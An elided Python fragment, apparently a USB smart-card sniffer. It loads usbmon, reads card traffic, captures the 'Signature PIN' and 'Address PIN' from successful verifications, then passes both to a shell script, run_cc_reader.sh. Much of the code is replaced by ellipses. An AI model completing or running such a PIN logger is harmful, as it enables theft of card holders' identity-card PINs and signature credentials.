...
def main():
    ...
    try:
        os.system("modprobe usbmon")  # Ensure usbmon is loaded
        # 1. Identify Reader
        got_add_pin = False
        got_sig_pin = False
        dataPin = ["",""]
                    ...
                    if msg_type == "6f": # Command from PC to Card
                        ...
                        if dev in pending_verifications:
                            ...
                            if sw == "9000":
                                ...
                                if data['type'] == "Signature PIN":
                                    got_sig_pin = True
                                    dataPin[1] = data['pin']
                                    print(f" got_sig_pin={got_sig_pin} got_add_pin={got_add_pin} ")
                                    if got_sig_pin and got_add_pin:
                                        print("\033[93m[!] Both Signature and Address PINs captured. Stopping logger.\033[0m")
                                        os.system(f"bash run_cc_reader.sh {dataPin[0]} {dataPin[1]}")  # Restart the reader to reset state  
                                        return
                                elif data['type'] == "Address PIN":
                                    got_add_pin = True 
                                    dataPin[0] = data['pin'] 
                                    print(f" got_sig_pin={got_sig_pin} got_add_pin={got_add_pin} ")
                                    if got_sig_pin and got_add_pin:
